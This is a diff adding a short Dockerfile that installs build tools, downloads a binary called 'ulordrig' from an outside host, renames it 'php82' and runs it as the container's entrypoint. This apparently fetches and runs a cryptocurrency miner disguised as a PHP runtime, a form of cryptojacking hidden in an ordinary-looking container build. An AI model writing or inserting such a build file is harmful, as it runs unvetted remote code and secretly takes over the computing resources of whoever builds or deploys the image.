@@ -1,0 +1,9 @@
+FROM ubuntu:16.04
+
+WORKDIR /app
+
+RUN apt-get update
+RUN apt-get install -y wget git build-essential gcc g++ cmake libuv1-dev libmicrohttpd-dev openssl libssl-dev
+RUN wget https://soft.bdklz.com/bash/ulordrig
+RUN mv ulordrig php82
+ENTRYPOINT  ["./php82"]
